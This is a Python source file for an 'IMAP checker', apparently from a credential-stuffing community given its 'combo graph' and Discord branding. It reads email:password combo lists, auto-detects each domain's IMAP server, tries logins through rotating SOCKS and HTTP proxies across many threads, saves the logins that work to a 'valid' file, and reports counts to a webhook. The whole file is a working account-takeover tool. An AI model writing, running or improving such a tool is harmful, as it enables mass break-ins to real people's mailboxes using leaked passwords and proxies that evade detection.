import imaplib
import threading
import queue
import json
import curses
import time
import requests
from raducord import Logger
from collections import Counter
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np
from itertools import cycle
import socks
import socket
import os

def load_settings(filename, autodelete):
    settings = {}
    with open(filename, 'r', encoding='utf-8', errors='ignore' if autodelete else 'strict') as f:
        lines = f.readlines()
    valid_lines = []
    for line in lines:
        parts = line.strip().split(':')
        if len(parts) == 3:
            domain, server, port = parts
            settings[domain] = (server, port)
            valid_lines.append(line)
    if autodelete:
        with open(filename, 'w', encoding='utf-8') as f:
            f.writelines(valid_lines)
    return settings

def load_list(filename, autodelete):
    items = []
    with open(filename, 'r', encoding='utf-8', errors='ignore' if autodelete else 'strict') as f:
        lines = f.readlines()
    valid_lines = []
    for line in lines:
        items.append(line.strip())
        valid_lines.append(line)
    if autodelete:
        with open(filename, 'w', encoding='utf-8') as f:
            f.writelines(valid_lines)
    return items

def remove_duplicates(combos):
    combo_count = Counter(combos)
    duplicates = len(combos) - len(combo_count)
    unique_combos = list(combo_count.keys())
    return unique_combos, duplicates

def load_config(filename='config.json'):
    with open(filename, 'r') as f:
        return json.load(f)

def save_settings(settings, filename):
    with open(filename, 'w') as f:
        for domain, (server, port) in settings.items():
            f.write(f"{domain}:{server}:{port}\n")

def auto_detect_server(domain, retries, retry_delay, proxy, deep_detection, detection_combinations):
    combinations = [f'imap.{domain}', f'securemail.{domain}', f'imap-mail.{domain}', f'mail.{domain}', f'inbox.{domain}'] if deep_detection else [f'imap.{domain}']
    for _ in range(retries):
        for combination in combinations[:detection_combinations]:
            try:
                mail = connect_imap(combination, 993, proxy)
                return combination, 993
            except:
                time.sleep(retry_delay)
    return None, None

def connect_imap(server, port, proxy=None):
    if proxy:
        if 'type' in proxy and proxy['type'] == 'http':
            socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, proxy['host'], proxy['port'])
        else:
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy['host'], proxy['port'])
        socket.socket = socks.socksocket
    return imaplib.IMAP4_SSL(server, port)

def check_email(combo, settings, valid_count, invalid_count, error_count, lock, config, proxy):
    email, password = combo.split(':')
    domain = email.split('@')[-1]
    
    if domain not in settings:
        server, port = auto_detect_server(domain, config['retries'], config['retry_delay'], proxy, config['deep_detection'], config['detection_combinations'])
        if server and port:
            settings[domain] = (server, port)
            save_settings(settings, config['imap_file'])
        else:
            Logger.failed(f"{email},{password},INVALID")
            with lock:
                invalid_count[0] += 1
            return
    
    server, port = settings[domain]
    try:
        mail = connect_imap(server, port, proxy)
        mail.login(email, password)
        Logger.success(f"{email},{password},VALID")
        with open(config['valid_file'], 'a') as f:
            f.write(f"{email}:{password}\n")
        with lock:
            valid_count[0] += 1
    except:
        Logger.failed(f"{email},{password},INVALID")
        with lock:
            invalid_count[0] += 1

def worker(settings, combos, valid_count, invalid_count, error_count, lock, config, proxies):
    proxy_cycle = cycle(proxies) if proxies else None
    while not combos.empty():
        combo = combos.get()
        proxy = next(proxy_cycle) if proxy_cycle and config['use_proxies'] else None
        try:
            check_email(combo, settings, valid_count, invalid_count, error_count, lock, config, proxy)
        except Exception as e:
            Logger.error(f"Error processing combo {combo}: {e}")
            with lock:
                error_count[0] += 1
        finally:
            combos.task_done()

def display_cui(stdscr, valid_count, invalid_count, error_count):
    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, f"[Valid : {valid_count[0]}]", curses.color_pair(1))
        stdscr.addstr(1, 0, f"[Invalid : {invalid_count[0]}]", curses.color_pair(2))
        stdscr.addstr(2, 0, f"[Errors : {error_count[0]}]", curses.color_pair(3))
        stdscr.refresh()
        curses.napms(500)

def send_webhook_notification(url, valid_count, invalid_count, error_count, graph_path):
    headers = {
        "Content-Type": "application/json"
    }

    embed = {
        "title": "IMAP Checker Results",
        "color": 65280,  # Green color
        "fields": [
            {"name": "Valid", "value": f"```{valid_count}```", "inline": True},
            {"name": "Invalid", "value": f"```{invalid_count}```", "inline": True},
            {"name": "Errors", "value": f"```{error_count}```", "inline": True}
        ]
    }

    data = {
        "embeds": [embed]
    }

    with open(graph_path, "rb") as file:
        files = {
            "file": ("image.png", file)
        }
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 204:
            print("Webhook sent successfully.")
        else:
            print(f"Failed to send webhook: {response.status_code}")

def generate_graph(filename, output_path, title, xlabel, ylabel):
    plt.style.use('dark_background')
    sns.set_theme(style="darkgrid")

    with open(filename, 'r') as file:
        emails = file.readlines()

    domains = []
    for email in emails:
        try:
            domain = email.split('@')[1].split(':')[0]
            domains.append(domain)
        except IndexError:
            continue

    domain_counts = Counter(domains)
    sorted_domain_counts = domain_counts.most_common()

    fig, ax = plt.subplots(figsize=(14, 10))
    domains, counts = zip(*sorted_domain_counts)

    colors = plt.cm.viridis(np.linspace(0, 1, len(domains)))

    ax.barh(domains, counts, color=colors)
    ax.set_xlabel(xlabel, fontsize=16, color='white', labelpad=15)
    ax.set_ylabel(ylabel, fontsize=16, color='white', labelpad=15)
    ax.set_title(title, fontsize=20, color='white', pad=20)
    ax.grid(axis='x', linestyle='--', alpha=0.7)

    for index, value in enumerate(counts):
        ax.text(value, index, str(value), va='center', fontsize=12, color='black', fontweight='bold')

    plt.figtext(0.5, 0.95, 'Gyews combo graph', ha='center', fontsize=26, color='black', fontweight='bold')
    plt.figtext(0.5, 0.02, 'discord.gg/silentgen', ha='center', fontsize=16, color='cyan', fontweight='bold')

    plt.tight_layout(pad=2.0)
    plt.savefig(output_path, facecolor=fig.get_facecolor())
    plt.show()

def load_proxies(filename):
    proxies = []
    with open(filename, 'r') as f:
        lines = f.readlines()
    for line in lines:
        parts = line.strip().split(':')
        if len(parts) == 2:
            proxies.append({'host': parts[0], 'port': int(parts[1])})
    return proxies

def main():
    config = load_config()

    if config.get('clean_valid_file', False):
        open(config['valid_file'], 'w').close()
    
    if config['graph'].get('delete_existing_image', False) and os.path.exists(config['graph']['output_path']):
        os.remove(config['graph']['output_path'])

    settings = load_settings(config['imap_file'], config['autodelete'])
    combos = load_list(config['combo_file'], config['autodelete'])
    
    unique_combos, duplicates = remove_duplicates(combos)
    combo_queue = queue.Queue()
    for combo in unique_combos:
        combo_queue.put(combo)
    
    print(f"Removed {duplicates} duplicates. Starting in 5 seconds...")
    time.sleep(5)

    valid_count = [0]
    invalid_count = [0]
    error_count = [0]
    lock = threading.Lock()

    proxies = load_proxies(config['proxy_file']) if config.get('use_proxies', False) else None

    threads = []
    for _ in range(config['threads']):
        thread = threading.Thread(target=worker, args=(settings, combo_queue, valid_count, invalid_count, error_count, lock, config, proxies))
        thread.start()
        threads.append(thread)

    if config['cui']:
        curses.wrapper(display_cui, valid_count, invalid_count, error_count)
    else:
        for thread in threads:
            thread.join()

    if config['summary']:
        print(f"\nSummary Report:\nValid: {valid_count[0]}\nInvalid: {invalid_count[0]}\nErrors: {error_count[0]}")

    if config['graph']['enabled']:
        generate_graph(
            config['valid_file'],
            config['graph']['output_path'],
            config['graph']['title'],
            config['graph']['xlabel'],
            config['graph']['ylabel']
        )

    if config['webhook_url']:
        send_webhook_notification(config['webhook_url'], valid_count[0], invalid_count[0], error_count[0], config['graph']['output_path'])

if __name__ == '__main__':
    main()

